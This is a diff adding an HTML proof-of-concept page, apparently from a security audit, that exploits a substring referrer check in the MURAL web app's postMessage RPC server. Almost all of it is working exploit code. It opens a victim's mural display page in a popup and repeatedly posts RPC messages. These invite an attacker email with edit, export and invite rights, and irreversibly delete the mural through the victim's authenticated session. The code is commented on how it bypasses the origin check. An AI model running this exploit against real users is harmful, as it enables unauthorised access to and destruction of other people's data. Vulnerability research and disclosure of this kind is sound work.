@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="referrer" content="unsafe-url">
+  <!--
+    Referrer-Policy: unsafe-url ensures document.referrer on the target page
+    is set to the full URL of this page (e.g. https://attacker.com/poc.html).
+
+    The RPC server origin check is:
+      document.referrer.includes(i.origin)
+
+    Since document.referrer = "https://attacker.com/poc.html"
+    and   i.origin          = "https://attacker.com"
+    the substring match passes for ANY attacker domain.
+
+    Even with default Referrer-Policy (strict-origin-when-cross-origin),
+    document.referrer = "https://attacker.com" (origin only) which still
+    passes the .includes() check.
+  -->
+  <title>MURAL RPC PoC — Blind Method Invocation</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 24px; }
+    h1 { color: #f0883e; margin-bottom: 8px; font-size: 18px; }
+    h2 { color: #58a6ff; margin: 16px 0 8px; font-size: 14px; }
+    .subtitle { color: #8b949e; margin-bottom: 16px; font-size: 12px; }
+    .config { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; margin-bottom: 16px; }
+    label { display: block; color: #8b949e; margin-bottom: 4px; font-size: 12px; }
+    input { width: 100%; background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; padding: 8px; border-radius: 4px; font-family: monospace; font-size: 13px; margin-bottom: 12px; }
+    .buttons { display: flex; gap: 8px; flex-wrap: wrap; }
+    button { background: #21262d; border: 1px solid #30363d; color: #c9d1d9; padding: 10px 16px; border-radius: 6px; cursor: pointer; font-family: monospace; font-size: 13px; }
+    button:hover { background: #30363d; }
+    button.danger { border-color: #f85149; color: #f85149; }
+    button.danger:hover { background: #f8514922; }
+    button.warn { border-color: #d29922; color: #d29922; }
+    button.warn:hover { background: #d2992222; }
+    button.critical { border-color: #f85149; color: #fff; background: #da3633; }
+    button.critical:hover { background: #f85149; }
+    #log { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 12px; font-size: 12px; min-height: 200px; max-height: 400px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
+    .log-info { color: #58a6ff; }
+    .log-send { color: #f0883e; }
+    .log-ok { color: #3fb950; }
+    .log-err { color: #f85149; }
+    .log-warn { color: #d29922; }
+    .vuln-info { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; margin-bottom: 16px; font-size: 12px; line-height: 1.6; }
+    .vuln-info code { background: #0d1117; padding: 2px 6px; border-radius: 3px; color: #f0883e; }
+  </style>
+</head>
+<body>
+
+<h1>MURAL RPC Server — Blind Method Invocation PoC</h1>
+<p class="subtitle">Finding #1 from browsing-context-audit.md | Severity: CRITICAL</p>
+
+<div class="vuln-info">
+  <strong>Vulnerability:</strong> The RPC server in <code>main.js:192007</code> uses
+  <code>document.referrer.includes(i.origin)</code> — a substring match that passes
+  for <em>any</em> attacker origin when the victim page is opened from the attacker's site.
+  Methods are invoked via dot-path traversal on the full SDK context object with
+  attacker-controlled arguments.<br><br>
+  <strong>Preconditions:</strong><br>
+  1. Victim must be authenticated to app.mural.co<br>
+  2. Target URL must be a <code>/display/</code> path (triggers <code>isDisplayApp()</code> → <code>startRpcServer(context)</code>)<br>
+  3. Victim must have permissions on the target mural (edit/admin for invite, owner/admin for delete)<br>
+  4. No <code>Cross-Origin-Opener-Policy</code> header on app.mural.co (confirmed absent)<br>
+  5. <code>frame-ancestors 'none'</code> blocks iframe attacks — this PoC uses <code>window.open()</code> instead
+</div>
+
+<div class="config">
+  <h2>Configuration</h2>
+
+  <label>Target Mural Display URL</label>
+  <input id="targetUrl" placeholder="https://app.mural.co/display/t/TEAM_ID/m/OWNER_ID/MURAL_ID"
+         value="https://app.mural.co/display/t/TEAM_ID/m/OWNER_ID/MURAL_ID">
+
+  <label>Attacker Email (for invitation attack)</label>
+  <input id="attackerEmail" placeholder="attacker@evil.com" value="attacker@evil.com">
+
+  <label>Delay before sending RPC messages (ms) — wait for mural JS to initialize</label>
+  <input id="delay" type="number" value="8000">
+
+  <label>Retry interval (ms) — resend if first attempt was too early</label>
+  <input id="retryInterval" type="number" value="2000">
+
+  <label>Max retries</label>
+  <input id="maxRetries" type="number" value="10">
+</div>
+
+<h2>Attacks</h2>
+<div class="buttons">
+  <button class="warn" onclick="launchAttack('invite')">
+    Invite Attacker (Edit Access)
+  </button>
+  <button class="danger" onclick="launchAttack('delete')">
+    Delete Mural
+  </button>
+  <button class="critical" onclick="launchAttack('combined')">
+    Combined: Invite + Delete
+  </button>
+</div>
+
+<h2>Log</h2>
+<div id="log"></div>
+
+<script>
+  const logEl = document.getElementById('log');
+
+  function log(msg, cls = 'log-info') {
+    const ts = new Date().toISOString().split('T')[1].slice(0, 12);
+    const line = document.createElement('div');
+    line.className = cls;
+    line.textContent = `[${ts}] ${msg}`;
+    logEl.appendChild(line);
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  /**
+   * Build the RPC postMessage payload.
+   *
+   * The RPC server (main.js:192022) expects:
+   *   { type: "mural.rpc_message", method: "dot.path", args: [...], rpcid: "..." }
+   *
+   * getValue(context, method) traverses the SDK context object via dot-path:
+   *   "dispatcher.mural.delete" → context.dispatcher.mural.delete
+   *
+   * The resolved function is called with: fn(...args) if args.length > 0, else fn()
+   */
+  function buildRpcMessage(method, args = []) {
+    return {
+      type: 'mural.rpc_message',
+      method: method,
+      args: args,
+      rpcid: crypto.randomUUID()
+    };
+  }
+
+  /**
+   * Send RPC message to target window with retry logic.
+   *
+   * We can't detect when startRpcServer() has initialized because
+   * dispatchPostMessage() only sends responses when window.parent !== window
+   * (iframe mode). In popup mode, responses are silently dropped.
+   *
+   * Strategy: send the message multiple times with delays. The first message
+   * that arrives after the RPC listener is registered will be processed.
+   * Duplicate messages after success will also execute (no idempotency check),
+   * but for delete, the second call would fail server-side (mural already gone).
+   */
+  function sendWithRetry(targetWindow, message, label) {
+    const delay = parseInt(document.getElementById('delay').value) || 8000;
+    const interval = parseInt(document.getElementById('retryInterval').value) || 2000;
+    const maxRetries = parseInt(document.getElementById('maxRetries').value) || 10;
+
+    log(`Waiting ${delay}ms for mural page to initialize...`, 'log-info');
+
+    setTimeout(() => {
+      let attempt = 0;
+
+      function trySend() {
+        if (attempt >= maxRetries) {
+          log(`Max retries (${maxRetries}) reached for: ${label}`, 'log-err');
+          return;
+        }
+        if (targetWindow.closed) {
+          log('Target window was closed — attack aborted', 'log-err');
+          return;
+        }
+
+        attempt++;
+        log(`[Attempt ${attempt}/${maxRetries}] Sending RPC: ${label}`, 'log-send');
+        log(`  method: ${message.method}`, 'log-send');
+        log(`  args: ${JSON.stringify(message.args)}`, 'log-send');
+
+        // Send to any origin — the RPC server checks document.referrer, not targetOrigin
+        targetWindow.postMessage(message, '*');
+
+        // Schedule next retry
+        // Note: we can't confirm execution since dispatchPostMessage is
+        // gated by window.parent !== window (always false in popup context)
+        if (attempt < maxRetries) {
+          setTimeout(trySend, interval);
+        }
+      }
+
+      trySend();
+    }, delay);
+  }
+
+  function launchAttack(mode) {
+    const targetUrl = document.getElementById('targetUrl').value.trim();
+    const attackerEmail = document.getElementById('attackerEmail').value.trim();
+
+    if (!targetUrl || !targetUrl.includes('/display')) {
+      log('ERROR: Target URL must contain /display path for isDisplayApp() to trigger startRpcServer()', 'log-err');
+      return;
+    }
+
+    log('='.repeat(60), 'log-info');
+    log(`Attack mode: ${mode.toUpperCase()}`, 'log-info');
+    log(`Target: ${targetUrl}`, 'log-info');
+
+    // Open target mural in new window
+    // This requires user gesture (button click) to bypass popup blockers
+    log('Opening target mural page via window.open()...', 'log-info');
+    const targetWindow = window.open(targetUrl, '_blank');
+
+    if (!targetWindow) {
+      log('ERROR: Popup blocked! The user must click the button (user gesture required).', 'log-err');
+      return;
+    }
+
+    log('Popup opened successfully', 'log-ok');
+    log(`document.referrer on target will be: ${window.location.href}`, 'log-info');
+    log(`Our origin: ${window.location.origin}`, 'log-info');
+    log(`Origin check will evaluate: "${window.location.href}".includes("${window.location.origin}") → true`, 'log-ok');
+
+    // --- Attack 1: Invite attacker with edit access ---
+    if (mode === 'invite' || mode === 'combined') {
+      /*
+       * dispatcher.mural.sharing.invitations.email(invitees, customText, notificationOverride)
+       *
+       * Source: main.js:110469
+       *   email: (i, n, o) => (async (i, n, o) => {
+       *     const a = await sendInvitations(i, n),
+       *
+       * sendInvitations(e, i) calls: n.share.invitations.email(e, i)
+       * Which calls: POST /api/v0/murals/{muralId}/members { members: e, customText: i }
+       *
+       * Invite object fields (from getEmailInviteRequest, muralcoPackages:11270-11293):
+       *   email, guest, readOnly, export, inviteOthers, duplicate,
+       *   facilitator, linkType, name, owner, refCode, roleId, surname, username
+       */
+      const inviteMessage = buildRpcMessage(
+        'dispatcher.mural.sharing.invitations.email',
+        [
+          // arg 1: invitees array
+          [
+            {
+              email: attackerEmail,
+              guest: false,        // invite as member, not guest
+              readOnly: false,     // full edit access
+              export: true,        // can export
+              inviteOthers: true,  // can invite others
+              facilitator: false   // not facilitator (could set true for more power)
+            }
+          ],
+          // arg 2: custom text (null = use default)
+          null
+        ]
+      );
+
+      log('', 'log-info');
+      log('--- INVITE ATTACK ---', 'log-warn');
+      log(`Will invite ${attackerEmail} as editor to the mural`, 'log-warn');
+      sendWithRetry(targetWindow, inviteMessage, `Invite ${attackerEmail}`);
+    }
+
+    // --- Attack 2: Delete the mural ---
+    if (mode === 'delete' || mode === 'combined') {
+      /*
+       * dispatcher.mural.delete()
+       *
+       * Source: main.js:110238
+       *   delete: async () => {
+       *     await o.default.remove(n.mural.get().id),
+       *     f.browserHistory.push((0, h.getRoomUrl)(Re, Ne));
+       *   }
+       *
+       * Calls DELETE /api/v0/murals/{muralId} using victim's authenticated session.
+       * No arguments needed — mural ID is read from internal state.
+       * After deletion, victim is redirected to the room/workspace URL.
+       */
+      const deleteMessage = buildRpcMessage('dispatcher.mural.delete', []);
+
+      log('', 'log-info');
+      log('--- DELETE ATTACK ---', 'log-err');
+      log('Will delete the target mural (irreversible)', 'log-err');
+
+      if (mode === 'combined') {
+        // For combined attack, delay delete to give invite time to execute
+        const extraDelay = 5000;
+        log(`Delaying delete by additional ${extraDelay}ms (let invite complete first)`, 'log-warn');
+        const baseDelay = parseInt(document.getElementById('delay').value) || 8000;
+        const origDelay = document.getElementById('delay').value;
+        document.getElementById('delay').value = baseDelay + extraDelay;
+        sendWithRetry(targetWindow, deleteMessage, 'Delete Mural');
+        document.getElementById('delay').value = origDelay;
+      } else {
+        sendWithRetry(targetWindow, deleteMessage, 'Delete Mural');
+      }
+    }
+  }
+
+  // Log page load
+  log('PoC loaded. Configure target URL and click an attack button.', 'log-ok');
+  log(`This page origin: ${window.location.origin || '(local file)'}`, 'log-info');
+  log('', 'log-info');
+  log('HOW IT WORKS:', 'log-info');
+  log('1. window.open() opens the mural /display/ page in a new tab', 'log-info');
+  log('2. document.referrer on the mural page = this page URL', 'log-info');
+  log('3. isDisplayApp() returns true → startRpcServer(context) initializes', 'log-info');
+  log('4. We send postMessage with type "mural.rpc_message"', 'log-info');
+  log('5. Origin check: document.referrer.includes(our_origin) → PASSES (substring match)', 'log-info');
+  log('6. getValue(context, method) resolves the dot-path to a function', 'log-info');
+  log('7. Function executes with our args using victim\'s authenticated session', 'log-info');
+  log('8. Response is suppressed (dispatchPostMessage gated by window.parent !== window)', 'log-info');
+  log('', 'log-info');
+  log('NOTE: This is a BLIND attack — we cannot read the response in popup mode.', 'log-warn');
+  log('The dispatchPostMessage function only sends when window.parent !== window (iframe only).', 'log-warn');
+  log('However, the method executes BEFORE the response dispatch, so side effects still fire.', 'log-warn');
+</script>
+
+</body>
+</html>
